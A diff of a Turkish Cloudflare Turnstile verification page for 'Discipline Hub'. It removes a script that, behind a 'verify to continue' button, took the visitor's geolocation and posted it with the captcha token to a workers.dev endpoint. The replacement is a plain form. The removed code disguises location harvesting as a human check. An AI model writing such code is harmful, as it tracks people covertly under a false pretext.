@@ -1,71 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
 <meta charset="UTF-8">
-<title>Devam Et</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discipline Hub</title>
 
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
 <style>
 body{
-  background:#111;
+  margin:0;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+  font-family:sans-serif;
   color:white;
-  font-family:Arial;
-  text-align:center;
-  padding-top:80px;
 }
+
+.card{
+  background:rgba(255,255,255,0.1);
+  padding:40px;
+  border-radius:20px;
+  backdrop-filter:blur(15px);
+  text-align:center;
+  animation:fadeIn 1s ease;
+}
+
 button{
-  padding:12px 25px;
-  font-size:16px;
-  background:#00bcd4;
+  margin-top:20px;
+  padding:10px 25px;
   border:none;
-  color:white;
+  border-radius:10px;
   cursor:pointer;
+}
+
+@keyframes fadeIn{
+  from{opacity:0; transform:translateY(20px);}
+  to{opacity:1; transform:translateY(0);}
 }
 </style>
 </head>
+
 <body>
 
-<h2>Devam etmek için doğrulama yapın</h2>
+<div class="card">
+  <h2>İnsan olduğunuzu doğrulayın</h2>
 
-<div class="cf-turnstile" data-sitekey="0x4AAAAAACajPIDrosxxpJUl"></div>
+  <form method="POST">
+    <div class="cf-turnstile"
+         data-sitekey="SITE_KEY_BURAYA">
+    </div>
 
-<br><br>
-<button onclick="gonder()">Devam</button>
+    <button type="submit">Doğrula</button>
+  </form>
 
-<script>
-function gonder() {
-
-  const token = document.querySelector("[name='cf-turnstile-response']").value;
-
-  if (!token) {
-    alert("Doğrulama yapın");
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(function(pos){
-
-    fetch("https://disciplinehub.disciplinehub.workers.dev", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        token: token,
-        latitude: pos.coords.latitude,
-        longitude: pos.coords.longitude
-      })
-    })
-    .then(res => res.json())
-    .then(data => {
-      alert("Başarılı");
-      console.log(data);
-    });
-
-  }, function(){
-    alert("Konum izni verilmedi");
-  });
-
-}
-</script>
+</div>
 
 </body>
 </html>
